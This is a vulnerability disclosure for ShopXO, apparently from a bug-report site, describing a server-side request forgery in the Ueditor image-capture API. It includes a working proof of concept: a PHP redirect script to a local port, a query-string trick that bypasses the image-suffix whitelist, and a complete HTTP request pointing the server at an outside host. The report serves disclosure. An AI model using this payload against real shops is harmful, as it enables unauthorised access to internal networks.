BUG_Author:
Rui Jie

Affected version:
ShopXO-Enterprise E-commerce System

Vendor:
https://shopxo.net/

Software:
https://github.com/gongfuxiang/shopxo
https://gitee.com/zongzhige/shopxo


Vulnerability File:
extend/base/Uploader.php

Description:
A vulnerability classified as critical has been discovered in Shopxo. This affects the remote part of the file Uploader.php. Manipulation of the parameter "source" leads to Cross-Site Request Forgery.
Attackers can achieve the attack through unauthorised api , any registered user can use the api to achieve remote image file capture , but there is no filtering can be completely bypassed , resulting in cross-site requests for access to achieve unauthorised access to the intranet ( SSRF )
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271331660.png)
Even though there is an image whitelisting suffix judgement. It is still possible to bypass the judgement by passing in `? ` to bypass the judgement.
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271333632.png)
At the same time, the local ip is banned, but you can access the local ip through the 302 jump.
For example
I put `shopxossrf.php` on my vps.
```
<?php
header("Location: http://127.0.0.1:67/ssrf");
```
Access to local port 67 is achieved by accessing `http://148.135.82.190/shopxossrf.php?1=cat.jpg'
payload
```
GET /api.php?s=Ueditor/Index/path_type/index&action=catchimage&XDEBUG_SESSION_START=12320&source[]=http://148.135.82.190/shopxossrf.php?1=cat.jpg HTTP/1.1
Host: 127.0.0.4
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=cbf871fe41acbafcbb8797c6b92feb4a; XDEBUG_SESSION=12320; uuid=3f9aa20c-1ee6-a46c-9a83-731dbf08cc97
sec-fetch-user: ?1
Connection: close
```

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271340268.png)
I got the request right away.
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271340840.png)
